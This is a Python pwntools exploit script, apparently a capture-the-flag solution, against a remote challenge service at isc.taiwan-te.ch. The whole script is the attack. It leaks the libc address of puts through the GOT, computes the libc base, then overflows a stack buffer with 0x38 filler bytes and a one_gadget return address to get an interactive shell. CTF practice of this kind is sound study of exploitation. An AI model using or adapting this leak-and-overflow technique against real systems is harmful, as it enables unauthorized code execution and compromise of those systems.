#!/usr/bin/env python2

from pwn import *
context.log_level = 'debug'

#init
p = remote('isc.taiwan-te.ch', 10006)

puts_got = '0x601018'
puts_offset = 0x00000000000809c0
one_gadget = 0x4f2c5

#leak libc
p.sendlineafter('Give me the address in hex:', puts_got)
p.recvuntil('\n')
p.recvuntil('Content: ')
libc_puts = int(p.recvuntil('\n', drop='True'))
libc_base = libc_puts - puts_offset
print '[+]libc base addr:', libc_base
print '[+]libc base addr(in hex):', hex(libc_base)

#exploit
payload = 'A' * (0x30 + 8) + p64((libc_base + one_gadget))
p.sendlineafter('Give me your messege:', payload)

#complete
p.interactive()
p.close()
